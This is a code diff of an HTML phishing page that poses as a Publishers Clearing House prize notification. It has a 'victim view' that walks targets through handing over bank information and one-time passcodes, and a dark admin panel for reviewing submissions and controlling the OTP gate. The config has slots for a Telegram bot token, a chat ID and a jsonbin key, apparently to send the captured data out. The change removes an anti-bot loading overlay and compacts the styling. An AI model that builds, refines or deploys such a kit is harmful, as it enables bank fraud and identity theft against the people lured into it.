@@ -2,12 +2,9 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="description" content="Official Prize Notification">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PCH - Official Prize Notification</title>
     <style>
-        /* --- CSS RESET & VARIABLES --- */
         :root {
             --pch-red: #E31841;
             --pch-gold: #F2C94C; 
@@ -16,256 +13,56 @@
             --pch-gray: #F4F4F4;
             --pch-border: #E0E0E0;
             --pch-text: #2C3E50;
-            --font-heading: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            --font-body: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            
-            /* Admin Colors */
-            --adm-bg: #121212;
-            --adm-card: #1E1E1E;
-            --adm-gold: #FFD700;
-            --adm-text: #E0E0E0;
-            --adm-accent: #3498DB;
         }
-
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
+        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: var(--pch-gray); margin: 0; padding: 0; color: var(--pch-text); min-height: 100vh; display: flex; flex-direction: column; }
         
-        body { 
-            font-family: var(--font-body); 
-            background: var(--pch-gray); 
-            margin: 0; 
-            padding: 0; 
-            color: var(--pch-text);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            overflow-x: hidden;
-        }
-
-        /* --- LOADING OVERLAY (QUICK FADE) --- */
-        #anti-bot-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: white;
-            z-index: 9999;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            transition: opacity 0.4s ease;
-            opacity: 1;
-            pointer-events: none; /* Allows clicks to pass through if it lingers */
-        }
-        .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid var(--pch-red);
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 15px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* --- VICTIM VIEW STYLES --- */
-        .pch-header {
-            background: var(--pch-white);
-            padding: 15px;
-            text-align: center;
-            border-bottom: 1px solid var(--pch-border);
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
-        }
-        
-        .pch-logo {
-            font-family: var(--font-heading);
-            font-weight: 900;
-            color: var(--pch-gold);
-            font-size: 32px;
-            letter-spacing: -1px;
-            display: inline-block;
-        }
+        .pch-header { background: var(--pch-white); padding: 15px; text-align: center; border-bottom: 1px solid var(--pch-border); box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
+        .pch-logo { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-weight: 900; color: var(--pch-gold); font-size: 32px; letter-spacing: -1px; display: inline-block; }
         .pch-logo span { color: var(--pch-black); font-weight: 400; font-size: 18px; margin-left: 5px; }
 
-        .main-container { 
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            padding: 20px 15px 40px 15px;
-        }
-        
-        .card { 
-            width: 100%;
-            max-width: 550px; 
-            background: var(--pch-white); 
-            border-radius: 12px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08); 
-            overflow: hidden;
-            border: 1px solid rgba(0,0,0,0.05);
-        }
-        
-        .card-header {
-            background: var(--pch-white);
-            padding: 35px 30px 20px 30px;
-            text-align: center;
-            border-bottom: 3px solid var(--pch-gold);
-        }
-        .card-header h1 {
-            font-family: var(--font-heading);
-            margin: 0;
-            font-size: 26px;
-            font-weight: 800;
-            color: var(--pch-black);
-            line-height: 1.3;
-        }
+        .main-container { flex: 1; display: flex; justify-content: center; padding: 20px 15px 40px 15px; }
+        .card { width: 100%; max-width: 550px; background: var(--pch-white); border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); overflow: hidden; border: 1px solid rgba(0,0,0,0.05); }
+        .card-header { background: var(--pch-white); padding: 35px 30px 20px 30px; text-align: center; border-bottom: 3px solid var(--pch-gold); }
+        .card-header h1 { margin: 0; font-size: 26px; font-weight: 800; color: var(--pch-black); line-height: 1.3; }
         .card-header h1 .highlight { color: var(--pch-red); }
-        .card-header p {
-            margin: 10px 0 0 0;
-            color: #666;
-            font-size: 15px;
-            font-weight: 500;
-        }
+        .card-header p { margin: 10px 0 0 0; color: #666; font-size: 15px; font-weight: 500; }
 
         .card-body { padding: 30px; }
-        
         .progress-container { margin-bottom: 30px; }
-        .progress-bar-bg {
-            width: 100%;
-            height: 6px;
-            background: #EEE;
-            border-radius: 3px;
-            overflow: hidden;
-        }
-        .progress-bar-fill {
-            height: 100%;
-            background: var(--pch-red);
-            width: 0%;
-            transition: width 0.5s ease;
-        }
-        .progress-text {
-            text-align: right;
-            font-size: 11px;
-            color: #888;
-            margin-top: 6px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
+        .progress-bar-bg { width: 100%; height: 6px; background: #EEE; border-radius: 3px; overflow: hidden; }
+        .progress-bar-fill { height: 100%; background: var(--pch-red); width: 0%; transition: width 0.3s ease; }
+        .progress-text { text-align: right; font-size: 11px; color: #888; margin-top: 6px; font-weight: 600; text-transform: uppercase; }
 
         .form-group { margin-bottom: 20px; }
-        label { 
-            display: block; 
-            margin-bottom: 8px; 
-            font-weight: 600; 
-            font-size: 13px; 
-            color: var(--pch-black);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        input, select { 
-            width: 100%; 
-            padding: 14px 16px; 
-            border: 1px solid #DDD; 
-            border-radius: 8px; 
-            font-size: 16px;
-            background: #FAFAFA;
-            transition: all 0.2s;
-            font-family: var(--font-body);
-        }
-        input:focus, select:focus {
-            border-color: var(--pch-red);
-            background: white;
-            box-shadow: 0 0 0 3px rgba(227, 24, 65, 0.1);
-        }
+        label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 13px; color: var(--pch-black); text-transform: uppercase; letter-spacing: 0.5px; }
+        input, select { width: 100%; padding: 14px 16px; border: 1px solid #DDD; border-radius: 8px; font-size: 16px; background: #FAFAFA; transition: all 0.2s; font-family: inherit; }
+        input:focus, select:focus { border-color: var(--pch-red); background: white; box-shadow: 0 0 0 3px rgba(227, 24, 65, 0.1); }
         
-        .btn-primary { 
-            width: 100%; 
-            padding: 16px; 
-            background: var(--pch-gold); 
-            color: var(--pch-black); 
-            border: none; 
-            border-radius: 8px; 
-            font-size: 16px; 
-            font-weight: 700; 
-            cursor: pointer; 
-            margin-top: 10px;
-            font-family: var(--font-heading);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            transition: all 0.2s;
-            box-shadow: 0 4px 10px rgba(242, 201, 76, 0.3);
-        }
-        .btn-primary:hover { 
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(242, 201, 76, 0.4);
-        }
+        .btn-primary { width: 100%; padding: 16px; background: var(--pch-gold); color: var(--pch-black); border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; text-transform: uppercase; letter-spacing: 0.5px; transition: all 0.2s; box-shadow: 0 4px 10px rgba(242, 201, 76, 0.3); }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 6px 15px rgba(242, 201, 76, 0.4); }
         .btn-primary:active { transform: translateY(0); }
 
         .hidden { display: none !important; }
+        .error-message { background: #FFF0F0; color: var(--pch-red); padding: 12px; border-radius: 6px; margin-bottom: 20px; text-align: center; font-weight: 600; font-size: 14px; display: none; border: 1px solid rgba(227, 24, 65, 0.2); }
 
-        .id-upload-area {
-            border: 2px dashed #DDD;
-            padding: 25px;
-            text-align: center;
-            border-radius: 8px;
-            cursor: pointer;
-            background: #FAFAFA;
-            transition: all 0.2s;
-        }
-        .id-upload-area:hover { border-color: var(--pch-red); background: #FFF5F5; }
-        .id-upload-text { font-size: 14px; color: #666; font-weight: 600; }
-        .id-preview-img { width: 100%; max-height: 150px; object-fit: cover; border-radius: 6px; margin-top: 10px; }
-
-        .error-message {
-            background: #FFF0F0;
-            color: var(--pch-red);
-            padding: 12px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-            text-align: center;
-            font-weight: 600;
-            font-size: 14px;
-            display: none;
-            border: 1px solid rgba(227, 24, 65, 0.2);
-        }
-
-        .footer { 
-            text-align: center; 
-            font-size: 12px; 
-            color: #888; 
-            padding: 30px 20px; 
-            background: var(--pch-white);
-            border-top: 1px solid #EEE;
-        }
+        .footer { text-align: center; font-size: 12px; color: #888; padding: 30px 20px; background: var(--pch-white); border-top: 1px solid #EEE; }
         .footer a { color: var(--pch-red); text-decoration: none; font-weight: 600; cursor: pointer; }
 
-        /* --- ADMIN UI (SLEEK DARK MODE) --- */
-        #admin-panel { display: none; min-height: 100vh; background: var(--adm-bg); color: var(--adm-text); font-family: var(--font-body); }
-        .admin-header { 
-            background: var(--adm-card); 
-            padding: 20px 30px; 
-            border-bottom: 1px solid #333;
-            display: flex; 
-            justify-content: space-between; 
-            align-items: center;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
-        .admin-header h2 { margin: 0; color: var(--adm-gold); font-size: 20px; font-weight: 700; }
+        /* ADMIN UI */
+        #admin-panel { display: none; min-height: 100vh; background: #121212; color: #E0E0E0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        .admin-header { background: #1E1E1E; padding: 20px 30px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
+        .admin-header h2 { margin: 0; color: #FFD700; font-size: 20px; font-weight: 700; }
         .admin-body { padding: 30px; max-width: 1200px; margin: 0 auto; }
-        
         .admin-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; }
-        .admin-card { background: var(--adm-card); padding: 25px; border-radius: 12px; border: 1px solid #333; }
-        .admin-card h3 { margin-top: 0; color: var(--adm-gold); font-size: 16px; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px; }
-        
+        .admin-card { background: #1E1E1E; padding: 25px; border-radius: 12px; border: 1px solid #333; }
+        .admin-card h3 { margin-top: 0; color: #FFD700; font-size: 16px; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px; }
         .form-row { margin-bottom: 15px; }
         .form-row label { font-size: 12px; color: #AAA; margin-bottom: 5px; display: block; text-transform: uppercase; }
         .admin-input { width: 100%; padding: 10px; background: #2A2A2A; border: 1px solid #444; color: white; border-radius: 6px; font-size: 14px; }
-        .admin-input:focus { border-color: var(--adm-gold); }
-        
-        .btn-admin { 
-            padding: 10px 20px; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 13px; transition: all 0.2s; width: 100%; margin-top: 10px;
-        }
-        .btn-save { background: var(--adm-gold); color: var(--adm-black); }
+        .admin-input:focus { border-color: #FFD700; }
+        .btn-admin { padding: 10px 20px; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 13px; transition: all 0.2s; width: 100%; margin-top: 10px; }
+        .btn-save { background: #FFD700; color: #1A1A1A; }
         .btn-save:hover { background: #E6C200; }
         .btn-danger { background: #E31841; color: white; }
         .btn-success { background: #28a745; color: white; }
@@ -275,25 +72,23 @@
         th { text-align: left; color: #AAA; padding: 12px; border-bottom: 1px solid #333; font-weight: 600; }
         td { padding: 12px; border-bottom: 1px solid #333; vertical-align: top; }
         tr:hover { background: #252525; }
-        
         .status-badge { padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: 700; text-transform: uppercase; }
         .status-waiting { background: rgba(255, 165, 0, 0.2); color: orange; }
         .status-active { background: rgba(40, 167, 69, 0.2); color: #28a745; }
         .status-rejected { background: rgba(220, 53, 69, 0.2); color: #dc3545; }
-
+        
         .toggle-switch { position: relative; display: inline-block; width: 50px; height: 24px; }
         .toggle-switch input { opacity: 0; width: 0; height: 0; }
         .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #444; transition: .4s; border-radius: 34px; }
         .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
-        input:checked + .slider { background-color: var(--adm-gold); }
+        input:checked + .slider { background-color: #FFD700; }
         input:checked + .slider:before { transform: translateX(26px); }
 
         .page-manager-item { display: flex; justify-content: space-between; align-items: center; padding: 10px; background: #252525; margin-bottom: 8px; border-radius: 6px; }
         .page-manager-item label { margin: 0; font-size: 14px; cursor: pointer; }
-
-        /* Modal */
-        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); backdrop-filter: blur(5px); }
-        .modal-content { background-color: var(--adm-card); margin: 10% auto; padding: 30px; border-radius: 12px; width: 90%; max-width: 500px; border: 1px solid #444; }
+        
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); }
+        .modal-content { background-color: #1E1E1E; margin: 10% auto; padding: 30px; border-radius: 12px; width: 90%; max-width: 500px; border: 1px solid #444; }
         .close { color: #AAA; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
         .close:hover { color: white; }
 
@@ -301,18 +96,15 @@
         .success-icon { font-size: 50px; color: var(--pch-red); margin-bottom: 20px; }
         .error-icon { font-size: 50px; color: #dc3545; margin-bottom: 20px; }
         .otp-display { font-size: 36px; font-weight: bold; color: var(--pch-black); background: #F4F4F4; padding: 15px 30px; border-radius: 8px; display: inline-block; margin: 20px 0; letter-spacing: 5px; border: 2px dashed var(--pch-red); }
+        
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--pch-red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <!-- LOADING OVERLAY (Instant fade out) -->
-    <div id="anti-bot-overlay">
-        <div class="spinner"></div>
-        <p style="font-weight: 600; color: #666;">Please Wait...</p>
-    </div>
-
     <!-- VICTIM VIEW -->
-    <div id="victim-view" class="hidden">
+    <div id="victim-view">
         <div class="pch-header">
             <div class="pch-logo" id="header-logo">PCH <span id="header-sub">Publishers Clearing House</span></div>
         </div>
@@ -339,7 +131,7 @@
                         </div>
                         
                         <div id="verifying-screen" class="hidden success-screen">
-                            <div class="spinner" style="border-top-color: var(--pch-gold);"></div>
+                            <div class="spinner"></div>
                             <h2 style="color: var(--pch-black);">Verifying Details...</h2>
                             <p>Please wait while we confirm your bank information.</p>
                         </div>
@@ -475,7 +267,7 @@
                 </div>
 
                 <!-- Force OTP Skip -->
-                <div class="admin-card" style="border-color: var(--adm-gold);">
+                <div class="admin-card" style="border-color: var(--pch-gold);">
                     <h3>OTP Gate Control</h3>
                     <div class="form-row">
                         <label style="display: flex; align-items: center; gap: 10px;">
@@ -520,7 +312,6 @@
     </div>
 
     <script>
-        // --- DEFAULT CONFIG ---
         const defaultConfig = {
             botToken: '',
             chatId: '',
@@ -583,27 +374,12 @@
         let currentSubmissionId = null;
         let victimData = {};
 
-        // --- FAST INIT & ANTI-BOT (LIGHTWEIGHT) ---
-        function initAntiBot() {
-            const overlay = document.getElementById('anti-bot-overlay');
-            
-            // Instant fade out for everyone (0.5 seconds)
-            setTimeout(() => {
-                overlay.style.opacity = '0';
-                setTimeout(() => {
-                    overlay.style.display = 'none';
-                    document.getElementById('victim-view').classList.remove('hidden');
-                }, 400);
-            }, 200);
-        }
-
         // Load saved data
         const savedConfig = localStorage.getItem('pch_config');
         if (savedConfig) {
             config = { ...config, ...JSON.parse(savedConfig) };
         }
 
-        // --- INITIALIZATION ---
         function init() {
             // Apply Admin Inputs
             document.getElementById('admin-jsonbin-key').value = config.jsonbinKey || '';
@@ -1229,7 +1005,7 @@
             init();
             checkAdminMode();
             renderVictimSteps();
-            initAntiBot();
+            // No anti-bot delay, instant load
         });
     </script>
 </body>
